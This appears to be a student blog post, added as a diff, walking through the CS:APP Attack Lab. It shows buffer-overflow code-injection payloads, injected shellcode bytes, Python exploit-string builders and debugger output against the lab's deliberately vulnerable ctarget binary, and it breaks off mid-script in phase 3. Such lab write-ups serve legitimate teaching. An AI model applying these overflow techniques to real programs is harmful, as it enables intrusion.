@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>attacklab | rubbishbin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Attack Lab How to">
+<meta property="og:type" content="article">
+<meta property="og:title" content="attacklab">
+<meta property="og:url" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/index.html">
+<meta property="og:site_name" content="rubbishbin">
+<meta property="og:description" content="Attack Lab How to">
+<meta property="og:locale">
+<meta property="og:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/stack.png">
+<meta property="og:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/refer.png">
+<meta property="og:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/sg1.png">
+<meta property="og:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/sg2.png">
+<meta property="og:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/sg3.png">
+<meta property="article:published_time" content="2021-09-13T06:14:24.000Z">
+<meta property="article:modified_time" content="2021-09-16T13:22:02.965Z">
+<meta property="article:author" content="rubbish">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/stack.png">
+  
+    <link rel="alternate" href="/atom.xml" title="rubbishbin" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">rubbishbin</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Buscar"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://rubbish-and-world.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CSAPP/attacklab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/13/CSAPP/attacklab/" class="article-date">
+  <time class="dt-published" datetime="2021-09-13T06:14:24.000Z" itemprop="datePublished">2021-09-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/csapp/">csapp</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      attacklab
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Attack-Lab-How-to"><a href="#Attack-Lab-How-to" class="headerlink" title="Attack Lab How to"></a>Attack Lab How to</h1><a id="more"></a>
+
+<h3 id="Agenda"><a href="#Agenda" class="headerlink" title="Agenda"></a>Agenda</h3><ul>
+<li>Phase 1-3 : Buffer Overflow</li>
+<li>Phase 4-5 : ROP</li>
+</ul>
+<h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><p><img src="/2021/09/13/CSAPP/attacklab/stack.png" alt="stack"></p>
+<p>(current <code>%rbp</code> is just pointing to the old <code>%rbp</code> and the return address is just above)</p>
+<h3 id="How-to-write-exploit-code"><a href="#How-to-write-exploit-code" class="headerlink" title="How to write exploit code ?"></a>How to write exploit code ?</h3><h4 id="Use-gcc"><a href="#Use-gcc" class="headerlink" title="Use gcc"></a>Use gcc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># source of exp.s</span><br><span class="line"># my exploit code</span><br><span class="line">movq $555,%rbx</span><br><span class="line">movq %rbx,%rax</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c exp.s</span><br><span class="line">$ objdump -d exp.o</span><br><span class="line">exp.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c3 2b 02 00 00 	mov    <span class="variable">$0x22b</span>,%rbx</span><br><span class="line">   7:	48 89 d8             	mov    %rbx,%rax</span><br></pre></td></tr></table></figure>
+<p>Then you get your exploit bytes:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c3 2b 02 00 00 	# mov    $0x22b,%rbx</span><br><span class="line">48 89 d8             	# mov    %rbx,%rax</span><br></pre></td></tr></table></figure>
+<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul>
+<li>Drawing stack graph is very useful</li>
+<li>Use ROP</li>
+</ul>
+<h2 id="Read-the-writeup"><a href="#Read-the-writeup" class="headerlink" title="Read the writeup"></a>Read the writeup</h2><h3 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h3><ul>
+<li><code>README.txt</code>: A file describing the contents of the directory</li>
+<li><code>ctarget</code>: An executable program vulnerable to <em>code-injection</em> attacks</li>
+<li><code>rtarget</code>: An executable program vulnerable to <em>return-oriented-programming</em> attacks</li>
+<li><code>cookie.txt</code>: An 8-digit hex code that you will use as a unique identifier in your attacks.</li>
+<li><code>farm.c</code>: The source code of your target’s “gadget farm,” which you will use in generating return-oriented programming attacks.</li>
+<li><code>hex2raw</code>: A utility to generate attack strings.</li>
+</ul>
+<h3 id="Important-points"><a href="#Important-points" class="headerlink" title="Important points"></a>Important points</h3><ul>
+<li>You must do the assignment on a machine that is similar to the one that generated your targets.</li>
+<li>You may only construct gadgets from file rtarget with addresses ranging between those for functions <code>start_farm</code> and <code>end_farm</code>.</li>
+<li>Your solutions may not use attacks to circumvent the validation code in the programs.</li>
+<li>Your exploit string must not contain byte value <code>0x0a</code> at any intermediate position, since this is the ASCII code for newline (<code>‘\n’</code>). When <code>Gets</code> encounters this byte, it will assume you intended to terminate the string.</li>
+<li><code>HEX2RAW</code> expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word <code>0xdeadbeef</code> you should pass “ef be ad de” to <code>HEX2RAW</code> (note the reversal required for little-endian byte ordering).</li>
+</ul>
+<h3 id="Target-programs"><a href="#Target-programs" class="headerlink" title="Target programs"></a>Target programs</h3><p>Both CTARGET and RTARGET read strings from standard input. They do so with the function getbuf defined below:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">Gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h3><p>This program is set up in a way that the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. </p>
+<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><p>your exploit string will redirect the program to execute an existing procedure.</p>
+<p>Your task is to get <code>CTARGET</code> to execute the code for <code>touch1</code> when <code>getbuf </code>executes its return statement, rather than returning to <code>test</code>. </p>
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>Phase 2 involves injecting a small amount of code as part of your exploit string</p>
+<p>Your task is to get <code>CTARGET</code> to execute the code for <code>touch2</code> rather than returning to <code>test</code>. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span> ;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x\n)&quot;</span>, val);    </span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span> , val);</span><br><span class="line">	fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><p>Phase 3 also involves a code injection attack, but passing a string as argument.</p>
+<p>Within the file <code>ctarget</code> there is code for functions <code>hexmatch</code> and <code>touch3</code> having the following C representations:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/* Make position of check string unpredictable */</span> </span><br><span class="line"><span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; </span><br><span class="line"><span class="comment">/* Part of validation protocol */</span> </span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Your task is to get <code>CTARGET</code> to execute the code for <code>touch3</code> rather than returning to <code>test</code>. You must make it appear to <code>touch3</code> as if you have passed a string representation of your cookie as its argument.</p>
+<h3 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h3><ul>
+<li>It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.</li>
+<li>It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.</li>
+</ul>
+<blockquote>
+<p><span style="color:red">ROP can bypass ASLR is an old story now!!! It only work for DEP now.</span></p>
+<p><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/70569/aslr-does-not-seem-to-randomize-text-section">description</a></p>
+<p>Verification:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * local = alloca(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack :%p\n&quot;</span> , local);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;code section :%p\n&quot;</span> , &amp;main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address of function:%p\n&quot;</span>, &amp;f);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for((i=0;i&lt;5;i++)) ./test</span></span><br><span class="line"><span class="comment"># doesn&#x27;t work in bash, it might be a zsh feature</span></span><br><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> 1 1 1 1 1 ; <span class="keyword">do</span> ./<span class="built_in">test</span>; <span class="keyword">done</span>;</span><br><span class="line">stack :0x7fffa96fc860</span><br><span class="line">code section :0x55d5afc056b1</span><br><span class="line">address of <span class="keyword">function</span>:0x55d5afc056aa</span><br><span class="line">stack :0x7ffd5f52a270</span><br><span class="line">code section :0x55869f60d6b1</span><br><span class="line">address of <span class="keyword">function</span>:0x55869f60d6aa</span><br><span class="line">stack :0x7ffee61d8040</span><br><span class="line">code section :0x5560accf16b1</span><br><span class="line">address of <span class="keyword">function</span>:0x5560accf16aa</span><br><span class="line">stack :0x7ffe122676e0</span><br><span class="line">code section :0x563d9fb196b1</span><br><span class="line">address of <span class="keyword">function</span>:0x563d9fb196aa</span><br><span class="line">stack :0x7fffb0521330</span><br><span class="line">code section :0x5606ed2d56b1</span><br><span class="line">address of <span class="keyword">function</span>:0x5606ed2d56aa</span><br></pre></td></tr></table></figure>
+
+<p>It seems that I cannot use ROP here.</p>
+<p><a target="_blank" rel="noopener" href="https://reverseengineering.stackexchange.com/questions/26553/bypassing-aslr-without-leak-address">Reason</a></p>
+</blockquote>
+<h4 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h4><p>For Phase 4, you will repeat the attack of Phase 2, but do so on program <code>RTARGET</code> using gadgets from your gadget farm</p>
+<h4 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h4><p><em>If you have other pressing obligations consider stopping right now.</em></p>
+<p>Phase 5 requires you to do an ROP attack on <code>RTARGET</code> to invoke function <code>touch3</code> with a pointer to a string representation of your cookie.</p>
+<hr>
+<p><img src="/2021/09/13/CSAPP/attacklab/refer.png" alt="reference"></p>
+<hr>
+<h2 id="My-solutions"><a href="#My-solutions" class="headerlink" title="My solutions"></a>My solutions</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p><em>Luckily there is no ASLR, the address of <code>touch1</code> is fixed</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; file ctarget </span><br><span class="line">Reading symbols from ctarget...done.</span><br><span class="line">pwndbg&gt; disassemble touch1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   ....</span><br><span class="line">pwndbg&gt; disassemble getbuf</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq </span><br></pre></td></tr></table></figure>
+<p>We can see that our target address is <code>0x00000000004017c0</code> and the buffer size is <code>0x28</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stage1&#x27;</span> , <span class="string">&#x27;wt+&#x27;</span>)</span><br><span class="line">address = <span class="string">&#x27;00000000004017c0&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;61&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x28</span>)])</span><br><span class="line">addressbytes = <span class="string">&#x27; &#x27;</span>.join( [ address[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(address)-<span class="number">2</span> , <span class="number">0</span> , -<span class="number">2</span>)])</span><br><span class="line">f.write(payload + <span class="string">&#x27; &#x27;</span> + addressbytes)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cat stage1</span><br><span class="line">61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00 00 00 00 00</span><br><span class="line">$ ./hex2raw -i stage1 &gt; exp1</span><br><span class="line">$ ./ctarget -q -i exp1</span><br><span class="line">....</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>The job is eased by the fact that <code>ctarget</code> will have our cookie after it start</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:</span><br><span class="line">$ strings ctarget | grep <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">gencookie.h</span><br><span class="line">gencookie.c</span><br><span class="line">gencookie</span><br><span class="line">gencookie.c</span><br><span class="line">gencookie.c</span><br><span class="line">cookie</span><br><span class="line">gencookie</span><br><span class="line">$ readelf -p .rodata ctarget | grep -e <span class="string">&#x27;Cookie&#x27;</span></span><br><span class="line">  [   262]  Cookie: 0x%x^J</span><br></pre></td></tr></table></figure>
+<p>In <code>touch2</code> the check statement is</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4017fc &lt;touch2+16&gt;    cmpl   0x202ce2(%rip), %edi &lt;0x6044e4&gt;</span><br></pre></td></tr></table></figure>
+<p>So we can easily find our cookie’s address is <code>0x6044e4</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;x /wx 0x6044e4</span><br><span class="line">0x6044e4 &lt;cookie&gt;:	0x59b997fa</span><br></pre></td></tr></table></figure>
+<p>The code we need to inject is <code>movq $0x59b997fa,%rdi</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59  	mov    $0x59b997fa,%rdi</span><br><span class="line">c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>Stack graph:</p>
+<p><img src="/2021/09/13/CSAPP/attacklab/sg1.png" alt="stack graph1"></p>
+<p>After <code>getbuf</code></p>
+<p><img src="/2021/09/13/CSAPP/attacklab/sg2.png" alt="stack graph2"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addressconvert</span>(<span class="params">address:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join( [ address[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(address)-<span class="number">2</span> , -<span class="number">2</span> , -<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stage2&#x27;</span> , <span class="string">&#x27;wt+&#x27;</span>)</span><br><span class="line">touch2address = <span class="string">&#x27;00000000004017ec&#x27;</span></span><br><span class="line">stackaddress = <span class="string">&#x27;&#123;:0&gt;16x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x5561dca0</span>-<span class="number">0x8</span>)</span><br><span class="line">codels = <span class="string">&#x27;48 c7 c7 fa 97 b9 59 c3&#x27;</span>.split()</span><br><span class="line"><span class="comment"># notice that instruction doesn&#x27;t need to be reversed !!!</span></span><br><span class="line">code = <span class="string">&#x27; &#x27;</span>.join(codels)</span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;61&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x28</span> - <span class="built_in">len</span>(codels))])</span><br><span class="line">touch2bytes = addressconvert(touch2address) </span><br><span class="line">stackbytes = addressconvert(stackaddress) </span><br><span class="line">f.write(payload + <span class="string">&#x27; &#x27;</span> + code  + <span class="string">&#x27; &#x27;</span> + stackbytes + <span class="string">&#x27; &#x27;</span> + touch2bytes  )</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;64bx $rsp</span><br><span class="line">0x5561dc78:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61</span><br><span class="line">0x5561dc80:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61</span><br><span class="line">0x5561dc88:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61</span><br><span class="line">0x5561dc90:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61</span><br><span class="line">0x5561dc98:	0x48	0xc7	0xc7	0xfa	0x97	0xb9	0x59	0xc3</span><br><span class="line">0x5561dca0:	0x98	0xdc	0x61	0x55	0x00	0x00	0x00	0x00</span><br><span class="line">0x5561dca8:	0xec	0x17	0x40	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x5561dcb0:	0x00	0x1f	0x40	0x00	0x00	0x00	0x00	0x00</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x4017bd   &lt;getbuf+21&gt;    retq&lt;0x5561dc98&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x5561dc98                movq   $0x59b997fa, %rdi</span><br><span class="line">   0x5561dc9f                retq</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ctarget -q -i exp2</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br></pre></td></tr></table></figure>
+<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><p><img src="/2021/09/13/CSAPP/attacklab/sg3.png" alt="stack graph3"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addressconvert</span>(<span class="params">address:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join( [ address[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(address)-<span class="number">2</span> , -<span class="number">2</span> , -<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stage3&#x27;</span> , <span class="string">&#x27;wt+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;59b997fa&#x27;</span></span><br><span class="line">cookiestr = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> cookie])</span><br><span class="line"></span><br><span class="line">codels = <span class="string">&#x27;48 c7 c7 78 dc 61 55 